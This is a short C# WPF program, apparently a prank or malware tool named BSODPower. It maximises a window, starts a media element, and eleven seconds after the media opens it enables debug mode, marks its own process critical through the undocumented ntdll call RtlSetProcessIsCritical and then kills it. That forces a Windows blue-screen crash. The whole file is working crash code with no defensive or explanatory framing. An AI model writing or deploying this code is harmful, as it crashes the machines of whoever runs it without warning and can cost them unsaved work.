using System;
using System.Collections.Generic;
using System.Text;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Data;
using System.Windows.Documents;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using System.Windows.Navigation;
using System.Windows.Shapes;
using System.Runtime.InteropServices;
using System.Threading;

namespace BSODPower
{
    /// <summary>
    /// Логика взаимодействия для MainWindow.xaml
    /// </summary>
    public partial class MainWindow : Window
    {
        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern void RtlSetProcessIsCritical(UInt32 v1, UInt32 v2, UInt32 v3);
        private bool StartCounting = false;
        private int Seconds = 0;
        public MainWindow()
        {
            InitializeComponent();
            Application.Current.MainWindow.WindowState = WindowState.Maximized;
            element.MediaOpened += Count;
            new Thread(() =>
            {
                while (Seconds < 11) {
                    if(StartCounting)
                    {
                        Thread.Sleep(1000);
                        Seconds++;
                    }
                }
                System.Diagnostics.Process.EnterDebugMode();
                RtlSetProcessIsCritical(1, 0, 0);
                System.Diagnostics.Process.GetCurrentProcess().Kill();
            }).Start();
        }
        public void Count(object sender, EventArgs e)
        {
            StartCounting = true;
        }
    }
}
